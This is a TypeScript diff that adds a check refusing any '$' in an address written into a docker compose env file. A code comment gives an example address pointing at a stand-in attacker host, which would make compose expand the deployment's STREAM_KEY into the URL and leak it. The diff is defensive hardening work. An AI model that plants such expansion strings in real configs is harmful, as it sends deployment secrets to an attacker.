@@ -140,6 +140,22 @@ const ADDRESS_WHITESPACE_MESSAGE =
   'this address must not contain a space, because the address that was checked and the address written into the env file would then not be the same one';
 
 /**
+ * A `$` anywhere is refused, rather than only a name docker compose would find.
+ *
+ * The file this address is written into is a full copy of the base env, which
+ * carries STREAM_KEY, API_AUTH_TOKEN and PUBLISH_KEY_SECRET, and compose
+ * expands `$NAME` and `${NAME}` in a value from the keys it parsed earlier in
+ * that same file. So `https://evil.example/${STREAM_KEY}` is an address a node
+ * then posts the deployment's signing key to. Which names resolve depends on
+ * what the base env happens to hold, which is why the character is refused and
+ * not a list of names.
+ */
+const EXPANSION_RE = /\$/;
+
+const ADDRESS_EXPANSION_MESSAGE =
+  'this address must not contain a $, because docker compose expands $NAME and ${NAME} inside a value in the env file this is written to, and what it would expand there are the deployment’s own secrets';
+
+/**
  * Why this address cannot be written where an address goes, or null.
  *
  * Asked of every address the URL parse let through, because the parse cannot
@@ -160,7 +176,8 @@ const ADDRESS_WHITESPACE_MESSAGE =
 function addressShapeProblem(value: string): string | null {
   return (
     envValueProblem(value) ??
-    (WHITESPACE_RE.test(value) ? ADDRESS_WHITESPACE_MESSAGE : null)
+    (WHITESPACE_RE.test(value) ? ADDRESS_WHITESPACE_MESSAGE : null) ??
+    (EXPANSION_RE.test(value) ? ADDRESS_EXPANSION_MESSAGE : null)
   );
 }
 
